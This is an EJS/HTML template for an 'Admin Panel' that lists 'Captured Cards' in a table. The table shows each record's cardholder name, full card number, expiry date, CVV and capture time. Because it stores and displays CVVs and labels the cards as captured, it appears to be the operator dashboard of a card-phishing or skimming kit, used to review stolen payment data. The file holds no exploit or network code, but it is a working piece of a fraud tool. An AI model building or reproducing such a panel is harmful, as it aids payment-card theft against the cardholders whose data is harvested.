<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Submitted Cards</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>

<body class="bg-light">
    <div class="container mt-5">
        <h2 class="mb-4">Admin Panel - Captured Cards</h2>
        <div class="card shadow-sm">
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-hover">
                        <thead class="table-dark">
                            <tr>
                                <th>#</th>
                                <th>Card Holder</th>
                                <th>Card Number</th>
                                <th>Expiry</th>
                                <th>CVV</th>
                                <th>Captured At</th>
                            </tr>
                        </thead>
                        <tbody>
                            <% if (cards.length> 0) { %>
                                <% cards.forEach((card, index)=> { %>
                                    <tr>
                                        <td>
                                            <%= index + 1 %>
                                        </td>
                                        <td>
                                            <%= card.cardHolderName %>
                                        </td>
                                        <td>
                                            <%= card.cardNumber %>
                                        </td>
                                        <td>
                                            <%= card.expiryDate %>
                                        </td>
                                        <td>
                                            <%= card.cvv %>
                                        </td>
                                        <td>
                                            <%= new Date(card.createdAt).toLocaleString() %>
                                        </td>
                                    </tr>
                                    <% }) %>
                                        <% } else { %>
                                            <tr>
                                                <td colspan="6" class="text-center">No records found.</td>
                                            </tr>
                                            <% } %>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</body>

</html>